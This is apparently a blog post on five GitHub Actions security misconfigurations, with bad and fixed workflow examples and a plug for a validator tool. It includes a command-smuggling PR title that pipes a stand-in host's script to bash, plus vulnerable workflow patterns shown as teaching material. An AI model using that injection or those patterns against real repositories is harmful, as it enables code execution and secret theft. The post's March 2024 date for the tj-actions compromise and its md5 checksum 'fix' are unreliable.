---
title: "The GitHub Actions security mistakes linters miss"
description: "YAML validators catch syntax, not exposure. Here are the five high-impact GitHub Actions misconfigurations — pull_request_target, script injection, unpinned actions, broad GITHUB_TOKEN scopes, and curl|bash — with the bad pattern and the fix for each."
pubDate: 2026-05-06
tags: ["github-actions", "security", "ci-cd"]
relatedTool:
  name: "GitHub Actions Validator"
  href: "/github-actions-validator"
---

![Shield with a keyhole over the dark hero title 'Security mistakes linters miss' — high-impact GitHub Actions security misconfigurations](/blog/github-actions-security-misconfigurations-hero.svg)

A YAML linter will tell you when your workflow won’t parse. It won’t tell you when your workflow hands a fork’s pull request a write token, or runs an attacker-controlled branch name as shell code. Those bugs are syntactically perfect — they pass every schema check, run green on the first try, and quietly widen your attack surface until someone notices.

GitHub Actions is unusually exposed because workflows are code that runs on every push, often with secrets in scope and a token that can write to the repo. The mistakes below are the ones that turn a routine CI pipeline into a supply-chain incident. None of them are caught by `actionlint`’s syntax pass alone, and all five are common enough that they show up in real public repos every week.

## 1. `pull_request_target` checking out untrusted code

The `pull_request_target` trigger runs with **the base repository’s secrets and a read/write token**, but it checks out the *target* branch by default — which is what makes it useful for labelling PRs or posting comments from forks. The trap is checking out the PR’s head and then *running* it. That executes attacker-controlled code with your secrets in scope.

```yaml
# BAD — runs fork code with repo secrets and a write token
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # untrusted!
      - run: npm install && npm run build              # arbitrary code
```

An attacker opens a PR whose `npm install` runs a malicious `postinstall` script, and that script can read `secrets.*` or exfiltrate the `GITHUB_TOKEN`. If you only need to *inspect* a PR, use `pull_request` (no secrets, read-only token) instead. If you genuinely need secrets — for example to post a status — split the work: build untrusted code in a `pull_request` job with no secrets, then act on its output in a separate, trusted workflow.

```yaml
# FIXED — untrusted code runs without secrets
on: pull_request          # forked PRs get a read-only token, no secrets
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # checks out PR head safely, unprivileged
      - run: npm ci && npm run build
```

Why it matters: this is the single most-exploited Actions pattern. Treating fork PRs as untrusted input is the whole game.

![A GitHub Actions workflow annotated with security mistakes: pull_request_target, an unpinned action, overly broad permissions and script injection](/blog/github-actions-security-misconfigurations-diagram.svg)

## 2. Script injection through `${{ github.event.* }}`

Anything a user can type — a PR title, a branch name, an issue body, a commit message — is attacker-controlled. When you interpolate it directly into a `run:` block, GitHub substitutes the raw string into the shell *before* the shell runs, so a crafted value becomes executable code.

```yaml
# BAD — PR title is spliced straight into the shell
- name: Greet
  run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl evil.sh | bash #` turns that single `echo` into two commands. The fix is to pass the untrusted value through an environment variable. Variables set in `env:` are not interpolated by the runner — the shell receives them as data, and quoting them keeps them inert.

```yaml
# FIXED — value arrives as data, never as code
- name: Greet
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building PR: $PR_TITLE"
```

Why it matters: it’s the easiest privilege escalation in CI and it needs no special trigger — any workflow that echoes user-supplied text is a candidate. The `env:` indirection costs two lines and closes the hole completely.

## 3. Third-party actions pinned to a tag

`uses: some/action@v3` resolves a mutable tag. The owner — or anyone who compromises that account — can move `v3` to point at new code, and your next run pulls it without you changing a thing. Tags are convenience aliases, not integrity guarantees.

```yaml
# BAD — mutable reference, can change under you
- uses: tj-actions/changed-files@v44
```

Pin third-party actions to a **full 40-character commit SHA**. A SHA is immutable: the only way to change what runs is for you to bump it deliberately, which is exactly the review point you want. Keep the human-readable version in a trailing comment so updates stay legible, and let Dependabot bump the pins for you.

```yaml
# FIXED — immutable, auditable pin
- uses: tj-actions/changed-files@a284dc1814e3fd07f2e34267fc8f81227ed29fb8 # v44.5.7
```

Why it matters: the March 2024 `tj-actions/changed-files` compromise — where a malicious commit was pushed behind existing tags and dumped secrets from thousands of repos — only affected workflows pinned to tags. SHA-pinned consumers were untouched.

## 4. Over-broad `GITHUB_TOKEN` permissions

If you never declare `permissions:`, the automatic `GITHUB_TOKEN` may default to broad read/write across the repo, depending on org and repo settings. That means a compromised step — say, a malicious dependency — can push commits, edit releases, or open pull requests using your own token.

```yaml
# BAD — no permissions block, token inherits broad defaults
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
```

Set a **read-only default at the top of the workflow**, then grant write scopes only to the specific jobs that need them. Most CI jobs need nothing more than `contents: read`. A job that publishes a release or pushes a comment gets exactly that one scope and no more.

```yaml
# FIXED — least privilege, scoped per job
on: push
permissions:
  contents: read            # workflow-wide default
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm test
  release:
    needs: test
    runs-on: ubuntu-latest
    permissions:
      contents: write       # only this job can write
    steps:
      - uses: actions/checkout@v4
      - run: ./scripts/publish.sh
```

Why it matters: least privilege turns “a compromised step owns the repo” into “a compromised step can read code it could already see.” It’s the cheapest blast-radius reduction you can make.

## 5. `curl | bash` inside a step

Piping a remote script straight into a shell runs whatever that URL serves *at the moment of the run*, with no pin, no checksum, and no review. If the host is compromised, or DNS is hijacked, or the maintainer simply pushes a bad version, it executes on your runner with your token in scope.

```yaml
# BAD — runs whatever the URL serves, unverified
- run: curl -sSL https://example.com/install.sh | bash
```

Pin the installer to a known version and verify its checksum before executing — or, better, use a vetted, SHA-pinned setup action that already does this. The point is to make “what code ran” a fact you can reconstruct after the fact.

```yaml
# FIXED — download, verify, then run
- run: |
    curl -fsSL -o install.sh https://example.com/v1.2.3/install.sh
    echo "9b74c9897bac770ffc029102a200c5de  install.sh" | md5sum -c -
    bash install.sh
```

Why it matters: `curl | bash` is an unsigned, unversioned dependency you re-fetch on every run. Pinning and verifying turns a blind trust into an auditable one.

## Catch these before they merge

Every one of these passes a YAML schema check, which is why a syntax linter sails right past them. They’re reachability and trust problems, not parse problems — and they’re exactly what review is supposed to catch but rarely does at a glance.

The **GitHub Actions Validator** checks all five, client-side, the moment you paste a workflow: it flags `pull_request_target` checkouts of untrusted refs, `${{ }}` interpolation in `run:` steps, unpinned third-party actions, missing or over-broad `permissions:`, and `curl | bash` invocations — alongside the ordinary YAML errors. Nothing uploads; your workflow never leaves the browser.

If you’ve ever shipped a workflow and hoped it was safe, this is the step that makes sure.

[Try the GitHub Actions Validator →](/github-actions-validator/)
